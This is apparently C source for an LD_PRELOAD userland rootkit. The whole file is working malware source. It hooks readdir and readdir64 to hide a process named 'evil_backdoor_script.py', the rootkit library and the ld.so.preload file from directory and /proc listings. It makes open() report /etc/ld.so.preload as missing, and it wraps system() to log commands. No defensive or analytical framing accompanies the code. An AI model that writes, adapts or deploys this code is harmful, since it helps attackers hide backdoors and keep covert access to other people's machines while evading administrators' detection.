#include <dlfcn.h>
#include <sys/types.h>
#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>

//Defines Here
#define PATH_MAX 4096
#define ROOTKIT_LIB "rootkit.so"
#define LD_PATH "/etc/ld.so.preload"
#define LD_FILE "ld.so.preload"
static const char* process_to_filter = "evil_backdoor_script.py";

#define HOOK(old_sym, sym) if(!old_sym) old_sym = dlsym(RTLD_NEXT, sym);

struct dirent64 {
    __ino64_t d_ino;
    __off64_t d_offset;
    int16_t d_reclen;
    int16_t d_namelen;
    char d_name[512];
};
//Old func Here
struct dirent* (*original_readdir)(DIR *);
struct dirent64* (*original_readdir64)(DIR *);
int (*orig_open)(const char *path, int oflag);
int (*old_system)(const char *str);

//Useful funcs
static int get_dir_name(DIR *dirp, char* buf, size_t size) {
    int fd = dirfd(dirp);
    if (fd == -1) {
        return 0;
    }
    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if (ret == -1) {
        return 0;
    }
    buf[ret] = 0;
    return 1;
}

static int get_process_name(char* pid, char* buf) {
    if(strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }
    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
    FILE* f = fopen(tmp, "r");
    if(f == NULL) {
        return 0;
    }
    if(fgets(tmp, sizeof(tmp), f) == NULL) {
        fclose(f);
        return 0;
    }
    fclose(f);
    int unused;
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;

}

//Declarations Here
#define DECLARE_READDIR(dirent, readdir)                                    \
struct dirent *readdir(DIR *dirp)                                           \
{                                                                           \
    HOOK(original_##readdir, #readdir)                                      \
    struct dirent *dir;                                                     \
    while(1)                                                                \
    {                                                                       \
        dir = original_##readdir(dirp);                                     \
        if(dir){                                                            \
            char dir_name[256];                                             \
            char process_name[256];                                         \
            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&            \
                strcmp(dir_name, "/proc") == 0 &&                           \
                get_process_name(dir->d_name, process_name) &&              \
                strcmp(process_name, process_to_filter) == 0 ||             \
                !strncmp(dir->d_name, ROOTKIT_LIB, strlen(ROOTKIT_LIB)) ||  \
                !strncmp(dir->d_name, LD_FILE, strlen(LD_FILE))) {          \
                    continue;                                               \
                }                                                           \
        }                                                                   \
        break;                                                              \
    }                                                                       \
    return dir;                                                             \
}                                                                           
DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);
int open(const char *path, int oflag, ...)
{
    char real_path[PATH_MAX];
    HOOK(orig_open, "open")
    realpath(path, real_path);
    char* proc_path = malloc(32);
    sprintf(proc_path, "/proc/%d/stat", getpid());
    if(strcmp(real_path, LD_PATH) == 0
    //strcmp(real_path, proc_path) == 0
        )
    {
        errno = ENOENT;
        return -1;
    }
    return orig_open(path, oflag);
}

int system(const char *str)
{
    HOOK(old_system, "system")
    printf("[+] system(): executing: %s; PID = %d\n", str, getpid());
    return old_system(str);
}
